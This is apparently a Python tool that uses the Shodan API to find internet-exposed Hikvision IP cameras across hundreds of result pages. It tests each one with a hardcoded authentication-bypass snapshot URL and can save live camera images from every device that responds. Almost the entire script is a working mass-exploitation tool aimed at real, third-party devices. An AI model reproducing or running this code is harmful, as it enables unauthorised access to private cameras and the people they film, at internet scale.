import shodan
import argparse
import requests
from datetime import date
from urllib import request

def dowloadSnapshotImg(url, ip, port):
    file_url = url
    file = str(ip)+"-"+str(port)+"_"+str(date.today())+".jfif"
    try:
        request.urlretrieve(file_url , file )
    except:
    	print("[!] Vulnerable but could not download snapshot")

def isVulnerable(url, verbose, ip, port):
    payload = "/onvif-http/snapshot?auth=YWRtaW46MTEK"
    try:
        r = requests.get(url+payload)
        status_code = r.status_code
    except:
        print("[!] Conection error - timed out")
        status_code = 404
        pass
    if status_code == 200:
        print("[+] Vulnerable! --> "+url+payload)
        if dowloadSnapshot:
            dowloadSnapshotImg(url+payload, ip, port)
    else:
        if verbose:
            print("[!] Not vulnerable")

def scan(token, dorkp, verbose, dork):
    API_KEY = token
    api = shodan.Shodan(API_KEY)
    
    for i in range(1,500):
        results = api.search(dork, page=i)
        for result in results['matches']:
            ip = result['ip_str']
            port = result['port']
            url = "http://"+str(ip)+":"+str(port)
            print("[!] Testing "+url)
            isVulnerable(url, verbose, ip, port)


def banner():
    print('  _     _ _           _     _             _____ _   _ ')
    print(' | |   (_) |         (_)   (_)           |_   _| \\ | |')
    print(' | |__  _| | ____   ___ ___ _  ___  _ __   | | |  \\| |')
    print(" | '_ \\| | |/ /\\ \\ / / / __| |/ _ \\| '_ \\  | | | . ` |")
    print(' | | | | |   <  \\ V /| \\__ \\ | (_) | | | |_| |_| |\\  |')
    print(" |_| |_|_|_|\\_\\  \\_/ |_|___/_|\\___/|_| |_|_____|_| \\_|\n")
    print("--------->https://github.com/diego-tella<------------")

banner()
parser = argparse.ArgumentParser(description='Scanner and exploit for HKVision Cams')
parser.add_argument('-d', '--dork', help='Personalized dork for the scan', type=str)
parser.add_argument('-s', '--savefile', action='store_true', help='Save snapshots from vulnerable cams')
parser.add_argument('-v', '--verbose', action='store_true', help='Verbose option')
parser.add_argument('-api', '--apitoken', type=str, help='Shodan API token', required=True)
args = parser.parse_args()
token = args.apitoken
dorkC = args.dork
verbose = args.verbose
dork = 'Product:"Hikvision IP Camera"'
dowloadSnapshot = args.savefile

if dorkC:
    dork = dorkC
if verbose:
    print("[+] Verbose: on")
else:
    print("[+] Verbose: off")
    verbose = False
if dowloadSnapshot:
    print("[+] Dowload snapshot: on")
else:
    print("[+] Dowload snapshot: off")
    dowloadSnapshot = False
print("[+] Dork used: "+dork)

scan(token, dork, verbose, dork)